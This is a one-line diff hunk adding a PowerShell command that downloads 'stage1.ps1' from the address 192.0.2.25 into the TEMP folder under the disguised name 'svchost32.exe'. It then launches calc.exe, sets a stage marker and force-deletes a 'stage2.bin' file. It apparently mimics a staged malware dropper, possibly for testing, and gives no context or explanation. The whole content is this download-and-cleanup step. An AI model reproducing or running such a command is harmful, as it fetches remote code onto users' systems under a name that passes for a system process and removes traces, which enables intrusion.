@@ -1,0 +1,1 @@
+$RemoteUrl = "http://192.0.2.25:80/stage1.ps1"; $PayloadPath = "$env:TEMP\svchost32.exe"; $TransferTimeout = 36; Invoke-WebRequest -Uri $RemoteUrl -OutFile $PayloadPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; $StageMarker = "stage-8"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
